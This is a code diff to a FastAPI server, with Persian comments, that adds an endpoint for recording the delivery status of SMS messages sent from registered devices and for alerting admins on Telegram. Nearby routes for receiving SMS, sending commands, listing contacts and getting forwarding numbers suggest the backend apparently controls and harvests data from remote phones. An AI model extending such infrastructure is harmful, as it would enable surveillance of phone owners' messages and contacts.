@@ -29,7 +29,7 @@ from .background_tasks import (
 from .models.schemas import (
     DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
     DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
-    AppTypeInfo, AppTypesResponse
+    AppTypeInfo, AppTypesResponse, SMSDeliveryStatusRequest, SMSDeliveryStatusResponse
 )
 from .models.admin_schemas import (
     Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
@@ -408,6 +408,143 @@ async def receive_sms(request: Request):
             status_code=500,
             detail=f"Internal server error: {str(e)}"
         )
+
+
+@app.post("/sms/delivery-status", response_model=SMSDeliveryStatusResponse)
+async def sms_delivery_status(delivery_data: SMSDeliveryStatusRequest):
+    """
+    📤 دریافت وضعیت ارسال SMS از دستگاه
+    
+    Status types:
+    - sent: ارسال شد
+    - delivered: تحویل داده شد
+    - failed: ارسال نشد
+    - not_delivered: تحویل داده نشد
+    
+    اگر sent یا delivered بود → SMS به لیست پیامک‌ها اضافه میشه
+    اگر failed یا not_delivered بود → فقط تو لاگ ثبت میشه
+    """
+    try:
+        logger.info(f"📬 SMS delivery status received: {delivery_data.model_dump()}")
+        
+        device_id = delivery_data.device_id
+        sms_id = delivery_data.sms_id
+        phone = delivery_data.phone
+        message = delivery_data.message
+        sim_slot = delivery_data.sim_slot
+        status = delivery_data.status.value
+        details = delivery_data.details
+        timestamp = delivery_data.timestamp
+        
+        # بررسی دستگاه
+        device = await device_service.get_device(device_id)
+        if not device:
+            logger.warning(f"⚠️ Device not found: {device_id}")
+            raise HTTPException(status_code=404, detail="Device not found")
+        
+        # ═══════════════════════════════════════════════════════
+        # ✅ SMS ارسال موفق (sent or delivered)
+        # ═══════════════════════════════════════════════════════
+        if status in ["sent", "delivered"]:
+            logger.info(f"✅ SMS successfully sent from device {device_id} to {phone}")
+            
+            # پیدا کردن شماره تلفن دستگاه از sim_info
+            device_phone = "Unknown"
+            sim_info = device.get("sim_info", [])
+            if sim_info and isinstance(sim_info, list) and len(sim_info) > sim_slot:
+                # اگر sim_slot مشخص بود، شماره اون سیم رو بگیر
+                device_phone = sim_info[sim_slot].get("phone_number", "Unknown")
+            elif sim_info and isinstance(sim_info, list) and len(sim_info) > 0:
+                # اگر نه، اولین سیم رو بگیر
+                device_phone = sim_info[0].get("phone_number", "Unknown")
+            
+            # ذخیره SMS در لیست پیامک‌ها (نوع sent)
+            sms_data = {
+                "from": device_phone,  # شماره گوشی
+                "to": phone,
+                "body": message.replace('\ufffd', '').strip() if message else "",
+                "timestamp": timestamp,
+                "type": "sent",  # نوع: ارسالی
+                "sms_id": sms_id,
+                "sim_slot": sim_slot,
+                "delivery_status": status,
+                "delivery_details": details,
+                "received_in_native": False  # این از طریق اپ ارسال شده
+            }
+            
+            await device_service.save_new_sms(device_id, sms_data)
+            
+            # لاگ موفقیت
+            await device_service.add_log(
+                device_id,
+                "sms",
+                f"SMS sent successfully to {phone} (SIM {sim_slot}) - Status: {status}",
+                "success",
+                metadata={
+                    "sms_id": sms_id,
+                    "phone": phone,
+                    "status": status,
+                    "sim_slot": sim_slot,
+                    "details": details
+                }
+            )
+            
+            return SMSDeliveryStatusResponse(
+                success=True,
+                message=f"SMS delivery status recorded: {status}",
+                saved_to_sms=True
+            )
+        
+        # ═══════════════════════════════════════════════════════
+        # ❌ SMS ارسال ناموفق (failed or not_delivered)
+        # ═══════════════════════════════════════════════════════
+        else:
+            logger.warning(f"❌ SMS failed to send from device {device_id} to {phone}: {details}")
+            
+            # فقط لاگ خطا
+            await device_service.add_log(
+                device_id,
+                "sms",
+                f"SMS send failed to {phone} (SIM {sim_slot}) - Status: {status} - {details}",
+                "error",
+                metadata={
+                    "sms_id": sms_id,
+                    "phone": phone,
+                    "status": status,
+                    "sim_slot": sim_slot,
+                    "details": details,
+                    "message_preview": message[:50] if message else ""
+                }
+            )
+            
+            # اعلان به ادمین در صورت فشل شدن
+            try:
+                if device.admin_username:
+                    await telegram_multi_service.send_to_admin(
+                        device.admin_username,
+                        f"❌ SMS Send Failed\n"
+                        f"📱 Device: <code>{device_id}</code>\n"
+                        f"📞 To: {phone}\n"
+                        f"📡 SIM: {sim_slot}\n"
+                        f"⚠️ Status: {status}\n"
+                        f"💬 Details: {details}",
+                        bot_index=2  # Bot 2: SMS notifications
+                    )
+            except Exception as tg_error:
+                logger.warning(f"⚠️ Failed to send Telegram notification: {tg_error}")
+            
+            return SMSDeliveryStatusResponse(
+                success=True,
+                message=f"SMS delivery status recorded: {status}",
+                saved_to_sms=False,
+                logged=True
+            )
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Error processing SMS delivery status: {e}", exc_info=True)
+        raise HTTPException(status_code=500, detail=str(e))
 
 
 @app.get("/api/getForwardingNumber/{device_id}")
